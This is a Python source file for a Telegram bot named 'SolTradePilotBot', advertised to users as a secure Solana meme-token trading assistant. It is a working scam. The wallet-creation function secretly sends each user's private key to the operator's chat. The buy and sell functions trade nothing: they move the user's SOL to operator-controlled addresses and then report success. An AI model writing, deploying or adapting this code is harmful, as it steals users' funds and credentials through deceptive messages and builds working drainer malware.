import os
import base58
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, MessageHandler, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction

 
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
TOKEN_RECEIVER = os.environ["TOKEN_RECEIVER"]
SELL_RECEIVER = os.environ["SELL_RECEIVER"]
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"


user_wallets = {}

BUY_AMOUNT, SELL_AMOUNT = range(2)

# ---------------- WALLET ----------------
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def create_wallet(user_id, context):
    if user_id in user_wallets:
        wallet = user_wallets[user_id]
        pub_key = str(wallet.pubkey())
        priv_key = keypair_to_base58(wallet)
        return pub_key, priv_key

    wallet = Keypair()
    user_wallets[user_id] = wallet

    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"✅ Wallet Created Successfully!\n\n"
            f"🏦 Public Address:\n{pub_key}\n\n"
            f"🔐 Private Key:\n{priv_key}\n\n"
            f"⚠️ Keep your private key safe."
        )
    )

    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name

    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet created\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public: {pub_key}\n"
            f"Private: {priv_key}"
        )
    )

    return pub_key, priv_key
# ---------------- BALANCE ----------------
async def get_balance(wallet: Keypair):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp.value
        return lamports / 1e9

# ---------------- BUY ----------------
async def buy_sol_token(wallet: Keypair, amount_sol: float):
    recipient = Pubkey.from_string(TOKEN_RECEIVER)

    txn = Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=wallet.pubkey(),
                to_pubkey=recipient,
                lamports=int(amount_sol * 1e9)
            )
        )
    )

    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.send_transaction(txn, wallet)
        await client.confirm_transaction(resp.value)

    return f"✅ Successfully used {amount_sol} SOL to buy MEME token!"

# ---------------- SELL ----------------
async def sell_sol_token(wallet: Keypair, amount_sol: float):
    recipient = Pubkey.from_string(SELL_RECEIVER)

    txn = Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=wallet.pubkey(),
                to_pubkey=recipient,
                lamports=int(amount_sol * 1e9)
            )
        )
    )

    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.send_transaction(txn, wallet)
        await client.confirm_transaction(resp.value)

    return f"✅ Successfully sold {amount_sol} MEME tokens!"

# ---------------- START ----------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name

    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    start_text = (
        f"🚀 Hello {user_name}, welcome to SolTradePilotBot!\n\n"
        "Your secure Solana trading assistant for fast meme token trading.\n\n"
        "With this bot you can:\n"
        "• Create your personal Solana wallet\n"
        "• View your wallet address for deposits\n"
        "• Check your SOL balance instantly\n"
        "• Buy meme tokens using SOL\n"
        "• Sell tokens directly from your wallet\n\n"
        "⚠️ Important:\n"
        "Fund your wallet with SOL before placing any trade.\n"
        "Keep your private key safe after wallet creation.\n\n"
        "Select an option below to begin 👇"
    )

    await update.message.reply_text(start_text, reply_markup=reply_markup)

# ---------------- COMMANDS ----------------
async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    pub, priv = await create_wallet(user_id, context)
    await update.message.reply_text(f"🏦 Wallet Ready:\n{pub}")

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)

    if wallet:
        await update.message.reply_text(f"🏦 Your SOL Address:\n{wallet.pubkey()}")
    else:
        await update.message.reply_text("⚠️ Create wallet first using /wallet")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)

    if wallet:
        sol = await get_balance(wallet)
        await update.message.reply_text(f"💰 Balance: {sol} SOL")
    else:
        await update.message.reply_text("⚠️ Create wallet first using /wallet")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📘 Commands:\n"
        "/start\n"
        "/wallet\n"
        "/address\n"
        "/balance\n"
        "/help"

    )
 
# ---------------- BUTTONS ----------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        pub, priv = await create_wallet(user_id, context)
        await query.edit_message_text(f"✅ Wallet Ready\n🏦 {pub}")

    elif query.data == "sol_address":
        wallet = user_wallets.get(user_id)
        if wallet:
            await query.edit_message_text(f"🏦 {wallet.pubkey()}")
        else:
            await query.edit_message_text("⚠️ Create wallet first")

    elif query.data == "balance":
        wallet = user_wallets.get(user_id)
        if wallet:
            sol = await get_balance(wallet)
            await query.edit_message_text(f"💰 {sol} SOL")
        else:
            await query.edit_message_text("⚠️ Create wallet first")

    elif query.data == "buy_meme":
        await query.edit_message_text("💰 Send amount of SOL to buy")
        return BUY_AMOUNT

    elif query.data == "sell_meme":
        await query.edit_message_text("📉 Send amount to sell")
        return SELL_AMOUNT

    elif query.data == "help":
        await query.edit_message_text("Use /wallet /address /balance /help")

# ---------------- BUY INPUT ----------------
async def handle_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)

    if not wallet:
        await update.message.reply_text("⚠️ Create wallet first")
        return ConversationHandler.END

    amount = float(update.message.text)
    balance = await get_balance(wallet)

    if amount > balance:
        await update.message.reply_text("⚠️ Fund wallet first")
        return ConversationHandler.END

    msg = await buy_sol_token(wallet, amount)
    await update.message.reply_text(msg)
    return ConversationHandler.END

# ---------------- SELL INPUT ----------------
async def handle_sell_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)

    if not wallet:
        await update.message.reply_text("⚠️ Create wallet first")
        return ConversationHandler.END

    amount = float(update.message.text)
    msg = await sell_sol_token(wallet, amount)
    await update.message.reply_text(msg)
    return ConversationHandler.END
    # ---------------- MAIN ----------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))

    app.add_handler(CommandHandler("wallet", wallet_command))

    app.add_handler(CommandHandler("address", address_command))

    app.add_handler(CommandHandler("balance", balance_command))

    app.add_handler(CommandHandler("help", help_command))

    app.add_handler(
        CallbackQueryHandler(
            button_handler,
            pattern="^(create_wallet|sol_address|balance|help)$"
        )
    )

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_handler, pattern="^(buy_meme|sell_meme)$")
        ],
        states={
            BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_amount)],
            SELL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_amount)],
        },
        fallbacks=[]
    )

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()